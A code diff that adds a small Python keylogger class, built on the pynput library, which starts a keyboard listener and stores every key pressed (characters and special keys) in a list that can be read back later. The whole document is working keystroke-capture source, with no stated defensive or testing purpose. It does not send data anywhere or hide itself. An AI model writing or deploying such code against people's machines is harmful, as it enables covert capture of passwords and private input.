@@ -1,0 +1,28 @@
+from IKeylogger import IKeyLogger
+from pynput import keyboard
+
+class KeyLogger(IKeyLogger):
+    def __init__(self):
+        self.keys = []
+        self.listener = None
+        self.is_logging = False
+
+    def _on_press(self, key):
+        try:
+            self.keys.append(key.char)
+        except AttributeError:
+            self.keys.append(str(key))
+
+    def start_logging(self):
+        if not self.is_logging:
+            self.listener = keyboard.Listener(on_press=self._on_press)
+            self.listener.start()
+            self.is_logging = True
+
+    def stop_logging(self):
+        if self.listener and self.is_logging:
+            self.listener.stop()
+            self.is_logging = False
+
+    def get_logged_keys(self):
+        return self.keys
